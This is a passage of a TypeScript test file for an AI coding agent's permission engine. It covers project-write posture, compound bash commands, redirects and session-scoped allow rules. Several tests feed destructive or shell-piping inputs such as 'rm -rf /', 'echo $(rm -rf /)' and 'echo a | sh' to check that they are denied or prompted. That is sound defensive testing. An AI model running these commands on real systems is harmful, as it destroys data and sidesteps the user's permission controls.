			const result = denyOverrideSuggestion("git branch -a | head -20", c);
			expect(result.status).toBe("override");
			if (result.status === "override") {
				expect(result.deny.id).toBe("legacy-0");
				expect(result.allow.rule.match.command).toBe("git branch * | head *");
			}
		} finally {
			removeSyncWithRetries(dir);
		}
	});
});

describe("project-writes posture (permissions.projectWrites)", () => {
	const makeDir = () => fs.mkdtempSync(path.join(os.tmpdir(), `perm-projectwrites-${Snowflake.next()}-`));
	const projectCwd = (base: string) => path.join(base, "proj");
	const insidePath = (base: string) => path.join(projectCwd(base), "src", "a.ts");

	it("configured allow auto-approves write tools inside the project root", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "allow" }, projectCwd(base));
			expect(evaluatePermission(tool("edit"), { path: insidePath(base) }, c).policy).toBe("allow");
			expect(evaluatePermission(tool("write"), { path: insidePath(base) }, c).policy).toBe("allow");
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("configured deny blocks writes inside the project root", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "deny" }, projectCwd(base));
			expect(evaluatePermission(tool("edit"), { path: insidePath(base) }, c).policy).toBe("deny");
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("paths outside the project root keep the general posture", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "allow" }, projectCwd(base));
			expect(evaluatePermission(tool("edit"), { path: path.join(base, "outside", "a.ts") }, c).policy).toBe(
				"prompt",
			);
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("relative and ~-prefixed paths resolve against cwd/home", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "allow" }, projectCwd(base));
			expect(evaluatePermission(tool("edit"), { path: "src/a.ts" }, c).policy).toBe("allow");
			// ~/… resolves into the home dir (a sibling of proj) → outside the
			// project root → general posture.
			expect(evaluatePermission(tool("edit"), { path: "~/x.ts" }, c).policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("unconfigured falls back to the general posture", () => {
		const base = makeDir();
		try {
			const c = ctx({}, projectCwd(base));
			expect(evaluatePermission(tool("edit"), { path: insidePath(base) }, c).policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("non-write tools are unaffected by the project-writes posture", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "allow" }, projectCwd(base));
			expect(evaluatePermission(tool("bash"), { command: "echo hi" }, c).policy).toBe("prompt");
		} finally {
			removeSyncWithRetries(base);
		}
	});
	it("ast_edit paths array is contained like a single path", () => {
		const base = makeDir();
		try {
			const c = ctx({ "permissions.projectWrites": "allow" }, projectCwd(base));
			expect(evaluatePermission(tool("ast_edit"), { ops: [], paths: [insidePath(base)] }, c).policy).toBe("allow");
		} finally {
			removeSyncWithRetries(base);
		}
	});
});

describe("posture allow vs unanalyzable residue (R1)", () => {
	// Nesting deeper than SUB_COMMAND_MAX_DEPTH makes extractSubCommands return
	// null — the "unanalyzable construct" prompt path.
	const deep = "echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo x))))))))";

	it("allow-all posture does not prompt on unanalyzable nesting", () => {
		const d = evaluateBashCommand(deep, ctx({ "permissions.default": "allow" }));
		expect(d.policy).toBe("allow");
	});
	it("allow-all posture still denies curated patterns inside substitutions", () => {
		const d = evaluateBashCommand("echo $(rm -rf /)", ctx({ "permissions.default": "allow" }));
		expect(d.policy).toBe("deny");
	});
});

describe("whole-command allow rules vs compounds", () => {
	// A remembered first-token rule (`cd *`) matches the WHOLE `&&`-joined
	// string too. The walk must not let that whole-command allow decide a
	// multi-piece call: `&&` is shell control, so it degraded to a prompt
	// even under allow-all posture, when every piece was posture- or
	// rule-allowed (the bash tool's per-piece evaluation is the granular
	// authority for compounds — the walk's allow gate mirrors the legacy
	// single-piece gate).
	const walkCtx = (dir: string, posture: string) => ({
		settings: engineSettingsFrom(Settings.isolated({ "permissions.default": posture })),
		cwd: "/tmp/perm-test",
		home: dir,
	});
	const writeUserRule = (dir: string, match: string, action: string) =>
		write(
			path.join(dir, ".omp", "agent", "permissions.yml"),
			`rules:\n  - id: walk-test\n    tool: bash\n    match: { command: '${match}' }\n    action: ${action}\n`,
		);

	it("allow-all posture does not prompt a compound matching a remembered first-token rule", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd *", "allow");
			const d = evaluatePermission(tool("bash"), { command: "cd /tmp && echo hi" }, walkCtx(dir, "allow"));
			expect(d.policy).toBe("allow");
			expect(d.source).toBe("posture");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("prompt posture still prompts the same compound without tool-level analysis", () => {
		// tool() carries no approval function, so the walk sees no per-piece
		// evaluation: a compound with only a first-token rule stays a posture
		// prompt. (With the real bash tool's all-covered allow it is allowed —
		// covered by the tool-allow test above.)
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd *", "allow");
			const d = evaluatePermission(tool("bash"), { command: "cd /tmp && echo hi" }, walkCtx(dir, "prompt"));
			expect(d.policy).toBe("prompt");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a compound fully covered by rules auto-allows in prompt posture (tool allow)", () => {
		// The bash tool runs its own engine per piece and declares policy
		// "allow" only when every piece is allowed (here: two rule-covered
		// pieces). The walk must defer to that instead of falling through to
		// a posture prompt — otherwise a fully rule-covered compound still
		// dialogs in prompt mode.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd *", "allow");
			writeUserRule(dir, "echo *", "allow");
			const bash = tool("bash", () => ({ tier: "write", policy: "allow" }));
			const d = evaluatePermission(bash, { command: "cd /tmp && echo hi" }, walkCtx(dir, "prompt"));
			expect(d).toMatchObject({ policy: "allow", source: "tool" });
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a whole-command deny rule beats a tool allow on a compound", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd /etc && echo *", "deny");
			const bash = tool("bash", () => ({ tier: "write", policy: "allow" }));
			const d = evaluatePermission(bash, { command: "cd /etc && echo hi" }, walkCtx(dir, "allow"));
			expect(d.policy).toBe("deny");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a project-internal redirect write is sanctioned by projectWrites: allow", () => {
		// Prompt posture + rule-covered base + project target +
		// projectWrites: allow → the redirect is analyzed as a write and the
		// piece is allowed — no shell-control blanket prompt.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd *", "allow");
			const c = {
				settings: engineSettingsFrom(
					Settings.isolated({
						"permissions.default": "prompt",
						"permissions.projectWrites": "allow",
					}),
				),
				cwd: "/tmp/perm-test",
				home: dir,
			};
			const d = evaluatePermission(tool("bash"), { command: "cd /tmp/perm-test > /tmp/perm-test/out.txt" }, c);
			expect(d.policy).toBe("allow");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a denied project-internal redirect write denies even under allow-all", () => {
		// projectWrites: deny must beat allow posture for a redirect into the
		// project — the write is explicit policy, exactly like the write tools.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			const c = {
				settings: engineSettingsFrom(
					Settings.isolated({
						"permissions.default": "allow",
						"permissions.projectWrites": "deny",
					}),
				),
				cwd: "/tmp/perm-test",
				home: dir,
			};
			const d = evaluatePermission(tool("bash"), { command: "echo hi > /tmp/perm-test/out.txt" }, c);
			expect(d.policy).toBe("deny");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("/dev/null redirects are sanctioned writes (no gate prompt)", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "echo *", "allow");
			const d = evaluatePermission(tool("bash"), { command: "echo hi > /dev/null" }, walkCtx(dir, "prompt"));
			expect(d.policy).toBe("allow");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("fd duplication (2>&1) is not a write and does not gate", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "echo *", "allow");
			const d = evaluatePermission(tool("bash"), { command: "echo hi 2>&1" }, walkCtx(dir, "prompt"));
			expect(d.policy).toBe("allow");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("single-piece redirect commands are checked as writes, not blanket-degraded", () => {
		// `cd /tmp > out` is one piece with a redirect: the redirect is a
		// write to `out`, sanctioned by posture under allow mode, so the
		// rule-backed base allow stands. Under prompt posture the write is
		// unsanctioned and the piece keeps prompting.
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			writeUserRule(dir, "cd *", "allow");
			const allowed = evaluatePermission(tool("bash"), { command: "cd /tmp > out" }, walkCtx(dir, "allow"));
			expect(allowed.policy).toBe("allow");
			const prompted = evaluatePermission(tool("bash"), { command: "cd /tmp > out" }, walkCtx(dir, "prompt"));
			expect(prompted.policy).toBe("prompt");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a whole-command deny rule still denies a compound", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-walk-${Snowflake.next()}-`));
		try {
			// The pattern only matches the joined string, never a single
			// piece; the walk's deny resolution must keep catching it.
			writeUserRule(dir, "cd /etc && echo *", "deny");
			const d = evaluatePermission(tool("bash"), { command: "cd /etc && echo hi" }, walkCtx(dir, "allow"));
			expect(d.policy).toBe("deny");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});
});

describe("session rules (bug 8)", () => {
	// The in-memory layer is module-global, keyed by session id (fallback:
	// cwd). Every test cleans the store so later files start empty.
	afterEach(() => clearSessionRules());

	const sessionRule = (match: Record<string, unknown>): Omit<PermissionRule, "layer"> => ({
		id: "session-echo",
		tool: "bash",
		match,
		action: "allow",
		reason: "approved for this session",
	});

	it("a session allow permits the same call again without a file rule", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-session-${Snowflake.next()}-`));
		try {
			const c = ctx({}, dir);
			expect(evaluatePermission(tool("bash"), { command: "echo hi" }, c).policy).toBe("prompt");
			addSessionRule(sessionRuleKey(c), sessionRule({ command: "echo hi" }));
			const d = evaluatePermission(tool("bash"), { command: "echo hi" }, c);
			expect(d).toMatchObject({ policy: "allow", layer: "session", ruleId: "session-echo" });
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a user deny beats a session allow of the same shape (deny-wins-ties)", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-session-${Snowflake.next()}-`));
		try {
			const c = ctx({}, dir);
			write(
				path.join(c.home, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-push\n    tool: bash\n    match: { command: 'git push *' }\n    action: deny\n",
			);
			addSessionRule(sessionRuleKey(c), sessionRule({ command: "git push *" }));
			const d = evaluatePermission(tool("bash"), { command: "git push origin main" }, c);
			expect(d.policy).toBe("deny");
			expect(d.layer).toBe("user");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("a more specific session allow beats a broader user deny (spec §3.1)", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-session-${Snowflake.next()}-`));
		try {
			const c = ctx({}, dir);
			write(
				path.join(c.home, ".omp", "agent", "permissions.yml"),
				"rules:\n  - id: deny-push\n    tool: bash\n    match: { command: 'git push *' }\n    action: deny\n",
			);
			addSessionRule(sessionRuleKey(c), sessionRule({ command: "git push origin main" }));
			const d = evaluatePermission(tool("bash"), { command: "git push origin main" }, c);
			expect(d.policy).toBe("allow");
			expect(d.layer).toBe("session");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("curated hard denies still beat a session allow", () => {
		addSessionRule(sessionRuleKey(ctx()), sessionRule({ command: "rm -rf *" }));
		const d = evaluateBashCommand("rm -rf /", ctx());
		expect(d.policy).toBe("deny");
		expect(d.layer).toBe("curated");
	});

	it("session rules are scoped to their session key", () => {
		const dir = fs.mkdtempSync(path.join(os.tmpdir(), `perm-session-${Snowflake.next()}-`));
		try {
			addSessionRule(sessionRuleKey(ctx({}, dir)), sessionRule({ command: "echo hi" }));
			// A different cwd (and no session id) is a different session.
			expect(evaluatePermission(tool("bash"), { command: "echo hi" }, ctx({}, "/other/cwd")).policy).toBe("prompt");
			expect(evaluatePermission(tool("bash"), { command: "echo hi" }, ctx({}, dir)).policy).toBe("allow");
		} finally {
			fs.rmSync(dir, { recursive: true, force: true });
		}
	});

	it("rule-backed session allows still degrade under shell control (R1)", () => {
		addSessionRule(sessionRuleKey(ctx()), sessionRule({ command: "echo *" }));
		// A pipeline with `sh` carries shell control: the session allow must
		// not silently vouch for it, exactly like a remembered file rule.
		const d = evaluateBashCommand("echo a | sh", ctx());
		expect(d.policy).toBe("prompt");
		expect(d.layer).toBeUndefined();
	});
});
